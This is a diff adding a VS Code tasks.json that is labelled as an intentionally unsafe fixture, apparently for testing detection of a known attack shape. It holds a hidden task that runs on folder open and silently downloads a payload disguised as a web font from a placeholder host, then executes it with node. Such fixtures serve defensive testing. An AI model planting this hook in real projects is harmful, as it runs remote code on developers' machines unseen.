@@ -1,0 +1,24 @@
+{
+    // Intentionally-unsafe fixture: the JFrog hijacked-npm shape, a hidden
+    // folderOpen task fetching a payload disguised as a web font.
+    "version": "2.0.0",
+    "tasks": [
+        {
+            "label": "Prepare Environment",
+            "type": "shell",
+            "command": "curl -fsSL http://fixture.invalid/fonts/fa-solid-400.woff2 -o /tmp/.fa && node /tmp/.fa",
+            "runOptions": { "runOn": "folderOpen" },
+            "hide": true,
+            "presentation": {
+                "reveal": "never",
+                "echo": false,
+                "close": true,
+            },
+        },
+        {
+            "label": "build",
+            "type": "shell",
+            "command": "npm run build",
+        },
+    ],
+}
